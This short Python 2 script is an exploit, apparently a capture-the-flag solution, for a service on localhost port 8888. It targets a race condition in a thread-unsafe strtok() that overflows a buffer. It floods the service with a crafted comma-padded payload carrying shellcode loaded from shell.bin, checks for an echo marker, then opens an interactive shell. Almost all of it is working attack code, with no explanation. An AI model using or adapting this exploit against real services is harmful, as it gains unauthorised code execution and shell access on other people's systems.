#!/usr/bin/env python

'''
strtok() is not thread-safe and may cause buffer overflow by race condition
'''

from util import *

s = service()
s.connect('127.0.0.1', 8888)

shellcode = open('shell.bin', 'rb').read()

expr = ', '*497 
payload = '1\n' + expr + ';' + expr + shellcode + '\n'

while True:
  s.send(payload * 10)
  s.send('echo AAAAAA\n')
  try:
    s.recvuntil('4 - poweroff\n')
  except socket.timeout:
    s.recvuntil('AAAAAA\n')
    break

print 'Pwn2sh!'
s.interact()

s.close()
